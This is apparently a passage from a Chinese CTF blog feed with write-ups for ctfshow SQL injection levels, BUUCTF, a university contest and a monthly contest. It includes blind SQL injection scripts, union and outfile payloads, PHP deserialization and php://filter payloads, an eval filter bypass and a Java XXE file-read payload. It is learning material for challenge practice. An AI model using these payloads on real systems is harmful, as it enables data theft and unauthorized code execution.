table_name&#x3D;’ctfshow_user3’–+</p><p>查字段：<br>?id&#x3D;-1’ union select 1,2,group_concat(concat_ws(‘~’,hex(username),hex(password))) from ctfshow_web.ctfshow_user3–+</p><h2 id="web174"><a href="#web174" class="headerlink" title="web174"></a>web174</h2><p>联合注入</p><p>查列数：<br>?id&#x3D;-1’ order by 1–+       &#x2F;&#x2F;无数据<br>?id&#x3D;-1’ order by 2–+       &#x2F;&#x2F;无数据<br>?id&#x3D;-1’ order by 3–+       &#x2F;&#x2F;数据接口请求异常：parsererror<br>说明有两列</p><p>?id&#x3D;-1’ union select replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(hex(schema_name),’1’,’numa’),’2’,’numb’),’3’,’numc’),’4’,’numd’),’5’,’nume’),’6’,’numf’),’7’,’numg’),’8’,’numh’),’9’,’numi’),’0’,’numj’),replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(hex(password),’1’,’numa’),’2’,’numb’),’3’,’numc’),’4’,’numd’),’5’,’nume’),’6’,’numf’),’7’,’numg’),’8’,’numh’),’9’,’numi’),’0’,’numj’) from ctfshow_web.ctfshow_user4–+</p><p>或者用二分法盲注脚本</p><figure class="highlight bash"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></div></td><td class="code"><pre><code class="hljs bash">import requests<br><br>url = <span class="hljs-string">&quot;http://53cf693e-a74e-48dd-ad1e-117b1854d281.challenge.ctf.show/api/v4.php?id=1&#x27; and &quot;</span><br><br>result = <span class="hljs-string">&#x27;&#x27;</span><br>i = 0<br><br><span class="hljs-keyword">while</span> True:<br>    i = i + 1<br>    <span class="hljs-built_in">head</span> = 32<br>    <span class="hljs-built_in">tail</span> = 127<br><br>    <span class="hljs-keyword">while</span> <span class="hljs-built_in">head</span> &lt; <span class="hljs-built_in">tail</span>:<br>        mid = (<span class="hljs-built_in">head</span> + <span class="hljs-built_in">tail</span>) &gt;&gt; 1<br>        payload = f<span class="hljs-string">&#x27;1=if(ascii(substr((select  password from ctfshow_user4 limit 24,1),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0) -- -&#x27;</span><br>        r = requests.get(url + payload)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;admin&quot;</span> <span class="hljs-keyword">in</span> r.text:<br>            <span class="hljs-built_in">head</span> = mid + 1<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">tail</span> = mid<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">head</span> != 32:<br>        result += chr(<span class="hljs-built_in">head</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">break</span><br>    <span class="hljs-built_in">print</span>(result)<br><br></code></pre></td></tr></table></figure><h2 id="web175"><a href="#web175" class="headerlink" title="web175"></a>web175</h2><p>联合注入利用outfile写文件<br>?id&#x3D;1’ union select 1,password from ctfshow_user5 into outfile ‘&#x2F;var&#x2F;www&#x2F;html&#x2F;1.txt’–+<br>然后访问<a href="http://eb463ec6-7f21-4c33-8074-2b2536162c81.challenge.ctf.show/1.txt%E5%8D%B3%E5%8F%AF">http://eb463ec6-7f21-4c33-8074-2b2536162c81.challenge.ctf.show/1.txt即可</a></p><p>或者利用时间盲注</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs bash">import requests<br>url = <span class="hljs-string">&quot;http://6bf4b4cc-bf93-4960-81af-697e62abeaa8.challenge.ctf.show:8080/api/v5.php&quot;</span><br>result = <span class="hljs-string">&#x27;&#x27;</span><br>i = 0<br><br><span class="hljs-keyword">while</span> True:<br>    i = i + 1<br>    <span class="hljs-built_in">head</span> = 32<br>    <span class="hljs-built_in">tail</span> = 127<br>    <span class="hljs-keyword">while</span> <span class="hljs-built_in">tail</span> &gt; <span class="hljs-built_in">head</span>:<br>        mid = (<span class="hljs-built_in">head</span> + <span class="hljs-built_in">tail</span>) // 2    <span class="hljs-comment"># //向下取整即7.5取7，/为浮点数表示法</span><br>        payload = <span class="hljs-string">&quot;?id=1&#x27; and if(ascii(substr((select  password from ctfshow_user5 where username=&#x27;flag&#x27;),&#123;0&#125;,1))&gt;&#123;1&#125;,sleep(2),0) -- -&quot;</span>.format(i, mid)<br>        <span class="hljs-comment"># print(url+payload)</span><br>        try:<br>            r = requests.get(url+payload, <span class="hljs-built_in">timeout</span>=0.5)     <span class="hljs-comment"># 如果0.5秒内返回结果，目标的ascii值小于等于mid，tail移动至中部，对于响应比较慢的网站，timeout应该设置大一点</span><br>            <span class="hljs-built_in">tail</span> = mid<br>        except Exception as e:      <span class="hljs-comment"># 0.5秒内未返回结果，目标ascii大于中间值，head移动至中部，因为是大于，所以还要加1</span><br>            <span class="hljs-built_in">head</span> = mid+1<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">head</span> == 32:        <span class="hljs-comment"># 如果这一位为空就会出现结束之后head等于32的情况，break退出</span><br>        <span class="hljs-built_in">break</span><br>    result += chr(<span class="hljs-built_in">head</span>)     <span class="hljs-comment"># 这里只能为head或者tail而不能为mid，因为mid可能会少一</span><br>    <span class="hljs-built_in">print</span>(result)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>buu刷题-5.9</title>
    <link href="/2022/05/09/buu%E5%88%B7%E9%A2%98-5.9/"/>
    <url>/2022/05/09/buu%E5%88%B7%E9%A2%98-5.9/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>全国大学生信息安全竞赛线上赛5.28~5.29开始，现在还啥都不会……<br>要快点开始刷题了，不过突然发现以前的题很简单了</p><h3 id="极客大挑战-2019-PHP"><a href="#极客大挑战-2019-PHP" class="headerlink" title="[极客大挑战 2019]PHP"></a>[极客大挑战 2019]PHP</h3><p>题目说<code>因为每次猫猫都在我键盘上乱跳，所以我有一个良好的备份网站的习惯 不愧是我！！！ </code><br>扫一下有个<code>www.zip</code>泄露，里面比较重要的是class.php和index.php<br>class.php</p><figure class="highlight php"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></div></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;flag.php&#x27;</span>;<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Name</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$username</span> = <span class="hljs-string">&#x27;nonono&#x27;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$password</span> = <span class="hljs-string">&#x27;yesyes&#x27;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$username</span>,<span class="hljs-variable">$password</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;username = <span class="hljs-variable">$username</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;password = <span class="hljs-variable">$password</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;username = <span class="hljs-string">&#x27;guest&#x27;</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;password != <span class="hljs-number">100</span>) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;You name is: &quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;username;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/br&gt;&quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;You password is: &quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;password;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/br&gt;&quot;</span>;<br>            <span class="hljs-keyword">die</span>();<br>        &#125;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;username === <span class="hljs-string">&#x27;admin&#x27;</span>) &#123;<br>            <span class="hljs-keyword">global</span> <span class="hljs-variable">$flag</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#x27;t give you the flag!&quot;</span>;<br>            <span class="hljs-keyword">die</span>();<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;class.php&#x27;</span>;<br>    <span class="hljs-variable">$select</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;select&#x27;</span>];<br>    <span class="hljs-variable">$res</span>=<span class="hljs-title function_ invoke__">unserialize</span>(@<span class="hljs-variable">$select</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>所以就是打反序列化啦<br><img src="http://81.70.101.23:11111/i/2022/05/09/sy51jv_0.png"><br>这里主要考察两点<br>一是private变量序列化时那个不可见字符是%00，占一个字节<br>二是绕过__wakeup魔术方法把类中变量数目比正常的多，比如3、4、5…都行</p><p>payload: <code>?select=O:4:&quot;Name&quot;:3:&#123;s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;s:3:&quot;100&quot;;&#125;</code></p><p><img src="http://81.70.101.23:11111/i/2022/05/09/sy538m_0.png"></p><h3 id="BJDCTF2020-Easy-MD5"><a href="#BJDCTF2020-Easy-MD5" class="headerlink" title="[BJDCTF2020]Easy MD5"></a>[BJDCTF2020]Easy MD5</h3><p>初始界面是个提交框，输入什么都没有回显，<br><img src="http://81.70.101.23:11111/i/2022/05/09/tsbhsq_0.png"></p><p>用burp抓包放包后看见hint<br><img src="http://81.70.101.23:11111/i/2022/05/09/tsbicf_0.png"></p><p><code>select * from &#39;admin&#39; where password=md5($pass,true)</code><br>这里有两个不知道的知识点：</p><p>一是md5函数当选定true模式后返回的是十六进制数据<br>比如<img src="http://81.70.101.23:11111/i/2022/05/09/tvk3m7_0.png"></p><p>二是ffifdyop这个字符串md5的十六进制值是’or’6xxxxxx，所以构造后就是<code>select * from &#39;admin&#39; where password=&#39;&#39;or&#39;6xxxxxx&#39;</code>恒真式，类似SQL注入</p><p>可以看到这里指向到levels91.php<br><img src="http://81.70.101.23:11111/i/2022/05/09/tsblwz_0.png"></p><p>访问<br><img src="http://81.70.101.23:11111/i/2022/05/09/tsbre5_0.png"></p><p>简单的md5数组绕过，又指向到levell14.php<br><img src="http://81.70.101.23:11111/i/2022/05/09/tsbjer_0.png"></p><p>访问<br><img src="http://81.70.101.23:11111/i/2022/05/09/tsbnua_0.png"></p><p>还是一样的数组绕过，得到flag<br><img src="http://81.70.101.23:11111/i/2022/05/09/tsbkt9_0.png"></p><h3 id="ZJCTF-2019-NiZhuanSiWei"><a href="#ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei"></a>[ZJCTF 2019]NiZhuanSiWei</h3><p>进入题目是源代码<br><img src="http://81.70.101.23:11111/i/2022/05/09/xmkzty_0.png"></p><p>第一个if判断可以用data伪协议<br>然后用filter伪协议配合源码里的include()函数读取useless.php<br><img src="http://81.70.101.23:11111/i/2022/05/09/xml057_0.png"></p><p>base64解密后得到useless.php<br><img src="http://81.70.101.23:11111/i/2022/05/09/xmkz01_0.png"></p><p>然后源码里unserialize函数可以利用反序列化漏洞读取flag.php<br>由于file_get_contents类似于include，稳妥起见依然可以用filter协议配合base64</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>  <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Flag</span></span>&#123;  <span class="hljs-comment">//flag.php  </span><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>=<span class="hljs-string">&#x27;php://filter/read=convert.base64-encode/resource=flag.php&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__tostring</span>(<span class="hljs-params"></span>)</span>&#123;  <br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;file))&#123;  <br>            <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable language_">$this</span>-&gt;file); <br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>        <span class="hljs-keyword">return</span> (<span class="hljs-string">&quot;U R SO CLOSE !///COME ON PLZ&quot;</span>);<br>        &#125;  <br>    &#125;  <br>&#125;<br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Flag</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>); <br><span class="hljs-comment">//O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:57:&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;&#125;</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>最终payload：?text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,d2VsY29tZSB0byB0aGUgempjdGY&#x3D;&amp;file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;useless.php&amp;password&#x3D;O:4:”Flag”:1:{s:4:”file”;s:57:”php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php”;}<br><img src="http://81.70.101.23:11111/i/2022/05/09/xml3d8_0.png"></p><p>base64解密后得到flag<br><img src="http://81.70.101.23:11111/i/2022/05/09/xmkz01_0.png"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>中国海洋大学CTF校赛复现</title>
    <link href="/2022/05/06/%E4%B8%AD%E5%9B%BD%E6%B5%B7%E6%B4%8B%E5%A4%A7%E5%AD%A6CTF%E6%A0%A1%E8%B5%9B%E5%A4%8D%E7%8E%B0/"/>
    <url>/2022/05/06/%E4%B8%AD%E5%9B%BD%E6%B5%B7%E6%B4%8B%E5%A4%A7%E5%AD%A6CTF%E6%A0%A1%E8%B5%9B%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>太菜了太菜了呜呜</p><h2 id="Web-你比香农都牛逼"><a href="#Web-你比香农都牛逼" class="headerlink" title="Web-你比香农都牛逼"></a>Web-你比香农都牛逼</h2><p>Web小游戏，直接在调试器里翻翻文件，看到jsfuck代码<br><img src="http://81.70.101.23:11111/i/2022/05/06/ezqp3n_0.png"></p><p>在控制台运行一下即可<br><img src="http://81.70.101.23:11111/i/2022/05/06/ezqpmk_0.png"></p><p>flag: flag{blue-whalerdle}</p><h2 id="Web-very-old-php-game"><a href="#Web-very-old-php-game" class="headerlink" title="Web-very old php game"></a>Web-very old php game</h2><p><img src="http://81.70.101.23:11111/i/2022/05/06/f6sbvb_0.png"><br>确实是个old题目<br>var_dump($$a)，只能对其中$a赋值，要保证$($a)还有意义<br>一种方法是猜测flag是存储在$flag变量中，传入a&#x3D;flag尝试<br><img src="http://81.70.101.23:11111/i/2022/05/06/f6se5h_0.png"></p><p>另一种方法是利用PHP中的超全局变量$GLOBALS<br>$GLOBALS包含了当前作用域所有的变量<br><img src="http://81.70.101.23:11111/i/2022/05/06/f6se86_0.png"></p><p>flag: flag{8VMa12Gts84z1QXgYh9K}</p><h2 id="Web-old-php-game"><a href="#Web-old-php-game" class="headerlink" title="Web-old php game"></a>Web-old php game</h2><p>同样是个old题目，原题是bugku的闪电十六鞭<br>打开题目可以看到”Click here”的按钮<br><img src="http://81.70.101.23:11111/i/2022/05/06/fjvt2s_0.png"></p><p>点击后发生跳转并追加了一个新的参数flag&#x3D;return’xxxxx’;<br><img src="http://81.70.101.23:11111/i/2022/05/06/fjvqwx_0.png"></p><p>审计一下代码，<br>1、首先是!isset($_GET[‘flag’])要求有flag参数传入<br>2、然后strlen($_GET[‘flag’]) !&#x3D; strlen($exam)要求长度要等于$exam，这里$exam的成分是return+<code>&#39;</code>+sha1+<code>&#39;</code>+<code>;</code>一共49位，即要求flag也是49位<br>3、preg_match(‘&#x2F;<code>|&quot;|\.|\\\\|\(|\)|\[|\]|_|flag|echo|print|require|include|die|exit/is&#39;, $_GET[&#39;flag&#39;])就是一些绕过 4、eval($_GET[&#39;flag&#39;]) === sha1($flag)这段代码除了满足if判断能</code>echo $flag;&#96;以外，eval本身也能任意执行，比如$_GET[‘flag’]里有输出的代码，即使不等于sha1($flag)，也能输出</p><p>由于过滤了echo等打印flag的函数，所以要用php中短标签来绕过<code>&lt;?=123?&gt;</code>，相当于<code>&lt;?echo 123;?&gt;</code>，开始还想用超全局变量$GLOBALS，但是这里短标签相当于echo，array类型的数组echo不出来，数组只能var_dump，所以只能拼接flag这四个字符</p><p>payload：<code>?flag=$a=fla1;$a&#123;3&#125;=g;111111111111111111111;?&gt;&lt;?=$$a;?&gt;</code><br>这里的111111111111111111111放哪都不影响<br><img src="http://81.70.101.23:11111/i/2022/05/06/fjvr64_0.png"></p><h2 id="Web-Baby-Unserialize"><a href="#Web-Baby-Unserialize" class="headerlink" title="Web-Baby Unserialize"></a>Web-Baby Unserialize</h2><p>看起来很’简单’的题……现在有两种解<br>一种是<code>fast destruct</code>，很新的漏洞，这种方法应该是预期解，因为本题php版本很高<br>一种是对<code>= &amp;</code>的利用，反正我也不会，呜呜呜呜呜</p><h3 id="解法一：fast-destruct"><a href="#解法一：fast-destruct" class="headerlink" title="解法一：fast destruct"></a>解法一：fast destruct</h3><p><img src="http://81.70.101.23:11111/i/2022/05/06/re5r7s_0.png"><br>首先审计一下代码，这里的__wakeup魔术方法并不难绕过，但是__destruct方法里输出的还是$i_am_not_flag，而flag的值是传给了$i_am_flag</p><h3 id="解法二：利用-x3D-amp-绕过"><a href="#解法二：利用-x3D-amp-绕过" class="headerlink" title="解法二：利用&#x3D;&amp;绕过"></a>解法二：利用&#x3D;&amp;绕过</h3><h2 id="Web-企业级项目实训"><a href="#Web-企业级项目实训" class="headerlink" title="Web-企业级项目实训"></a>Web-企业级项目实训</h2><p>目前不是完全理解本题目<br>原理是在访问&#x2F;auth&#x2F;login时Content-Type存在log4j2漏洞<br>利用JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar就可以打<br><img src="http://81.70.101.23:11111/i/2022/05/06/sn9btd_0.png"></p><p>参考文章：<a href="https://blog.csdn.net/weixin_52091458/article/details/121980780">Le1a师傅的文章</a></p><h2 id="Misc-Checkin"><a href="#Misc-Checkin" class="headerlink" title="Misc-Checkin"></a>Misc-Checkin</h2><p>现在签到我都做不出来了…..<br><img src="http://81.70.101.23:11111/i/2022/05/06/3.png"></p><p>用在线工具将海报的二维码扫出来就有flag了，我个大傻子一直在对整张图片搞搞搞<br><img src="http://81.70.101.23:11111/i/2022/05/06/ssap3n_0.png"></p><h2 id="Misc-bitjungle"><a href="#Misc-bitjungle" class="headerlink" title="Misc-bitjungle"></a>Misc-bitjungle</h2><p>给的两张图片，那应该就是盲水印了<br><code>python3 bwm3.py decode bitjungle.png bitjungle2.png ex.png --alpha 20</code></p><p>得到一张图片，里面有一个文件的路径<br>下载下来binwalk出一个压缩包<br>压缩包末尾的十六进制转字符是嗷呜嗷呜兽音加密，解密就是压缩包密码<br>解压出来就是flag</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>neuqcsa-四月月赛</title>
    <link href="/2022/04/18/neuqcsa-%E5%9B%9B%E6%9C%88%E6%9C%88%E8%B5%9B/"/>
    <url>/2022/04/18/neuqcsa-%E5%9B%9B%E6%9C%88%E6%9C%88%E8%B5%9B/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>感觉好长时间没打过月赛了，两天时间，不过感觉题有点少</p><h2 id="Web-llllaravellll"><a href="#Web-llllaravellll" class="headerlink" title="Web-llllaravellll"></a>Web-llllaravellll</h2><p>只给一个laravel框架搭建成功的页面，没找他其他提示便进行扫描<br><img src="http://81.70.101.23:11111/i/2022/04/18/j36oil_0.png"><br>.htaccess、web.config和robots.txt都是配置文件，没发现有用的地方<br>hello界面看起来有点东西但没提示先放一边<br>剩一个&#x2F;_ignition&#x2F;execute-solution访问，发现报错页面<br><img src="http://81.70.101.23:11111/i/2022/04/18/j33x4n_0.png"></p><p>提示需要POST数据，看了下相关文件也不知道大概要干啥<br>一般像这种框架类的漏洞网上很多文章分析<br>于是google：ctf laravel8 漏洞<br>看了几篇文章，laravel8大概就两个漏洞：反序列化、Debug RCE(CVE-2021-3129)<br>但是反序列化我们没全部源码找不到反序列化点<br>debug rce版本符合也有&#x2F;_ignition&#x2F;execute-solution<br>进行尝试<br><img src="http://81.70.101.23:11111/i/2022/04/18/j36mj8_0.png"></p><p>发现有报错信息：file_get_contents(b1ub1u): failed to open stream: No such file or directory in file<br>证明有这个漏洞<br>原理大概是操控 ..&#x2F;storage&#x2F;logs&#x2F;laravel.log 日志文件，配合 php:&#x2F;&#x2F;filter的特性来构建 phar 文件(这里需要用phpggc里的链子构造文件)，执行反序列化<br>手注的话每次命令都要发五个包，于是我选择上github直接搜集成好链子的工具嘿嘿<br>试了第二次就有行的了，在python里改命令就行<br><img src="http://81.70.101.23:11111/i/2022/04/18/j36j9k_0.png"></p><p>Flag：flag{LaRAvel_1s_PrEtTy_1nterRESt1NG!}</p><h2 id="Web-babyser"><a href="#Web-babyser" class="headerlink" title="Web-babyser"></a>Web-babyser</h2><p>题目给的war包让大家审计一下三个java文件<br>User.java注意到重写了readObject方法，并且里面用到了DocumentBuilderFactory类</p><p>HelloServlet.java可以注意到用到了append(“Hello! “ + u.name)，这里可以联想到类似于SSTI的方法，传入的name如果有漏洞，可以通过u.name回显出来，可以留意一下</p><p>HelloInputStream.java我没有很看懂，只认识出”top.inhann.babyser.User”，但下面那个resolveClass没有太理解</p><p>综合三个java文件，没有直接能得出flag的方法&#x2F;类，也没有明确flag出现的条件。<br>所以尝试从DocumentBuilderFactory类入手<br>搜了一下都是关于XML的，然后晚上又放一个hint：xxe，所以方向应该没错了</p><p>呃这里直接从网上找到了类似的exp，等比赛完再仔细分析一下，因为这个DocumentBuilderFactory类好像不算少见。原理就是DocumentBuilderFactory类能读取xxe，然后回显到u.name</p><p>重写一下User.java，增加一个writeObject方法</p><figure class="highlight xml"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><pre><code class="hljs xml">private void writeObject (ObjectOutputStream out) throws ClassNotFoundException, IOException, ParserConfigurationException, SAXException&#123;<br>      String xml = &quot;<span class="hljs-meta">&lt;?xml version=\&quot;1.0\&quot; encoding=\&quot;UTF-8\&quot;?&gt;</span>  \n&quot; +<br>              &quot;<span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">ANY</span> [  \n&quot; +</span><br><span class="hljs-meta">              &quot;<span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">shit</span> <span class="hljs-keyword">SYSTEM</span> \<span class="hljs-string">&quot;file:///flag.txt\&quot;&gt;   \n&quot;</span> +</span></span><br><span class="hljs-meta"><span class="hljs-meta">              <span class="hljs-string">&quot;]&gt;  \n&quot;</span> +</span></span><br><span class="hljs-meta"><span class="hljs-meta">              <span class="hljs-string">&quot;&lt;root&gt;&lt;tag&gt;&amp;shit;&lt;/tag&gt;&lt;/root&gt; &quot;</span>;</span></span><br><span class="hljs-meta"><span class="hljs-meta">      <span class="hljs-keyword">byte</span>[] <span class="hljs-keyword">bs</span> = <span class="hljs-keyword">xml</span>.getBytes();</span></span><br><span class="hljs-meta"><span class="hljs-meta">      <span class="hljs-keyword">out</span>.writeInt(<span class="hljs-keyword">bs</span>.<span class="hljs-keyword">length</span>);</span></span><br><span class="hljs-meta"><span class="hljs-meta">      <span class="hljs-keyword">ByteArrayOutputStream</span> <span class="hljs-keyword">baos</span> = <span class="hljs-keyword">new</span> <span class="hljs-keyword">ByteArrayOutputStream</span>(<span class="hljs-keyword">bs</span>.<span class="hljs-keyword">length</span>);</span></span><br><span class="hljs-meta"><span class="hljs-meta">      <span class="hljs-keyword">baos</span>.write(<span class="hljs-keyword">bs</span>);</span></span><br><span class="hljs-meta"><span class="hljs-meta">      <span class="hljs-keyword">out</span>.write(<span class="hljs-keyword">baos</span>.<span class="hljs-keyword">toByteArray</span>());</span></span><br><span class="hljs-meta"><span class="hljs-meta">   &#125;</span></span><br></code></pre></td></tr></table></figure><p>然后新建一个test.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> top.inhann.babyser;<span class="hljs-comment">//这里好像要对应HelloInputStream.java里的白名单</span><br><br><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>(<span class="hljs-string">&quot;b1ub1u&quot;</span>);<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;./exp&quot;</span>));<br>        oos.writeObject(user);<br>        oos.close();<br>    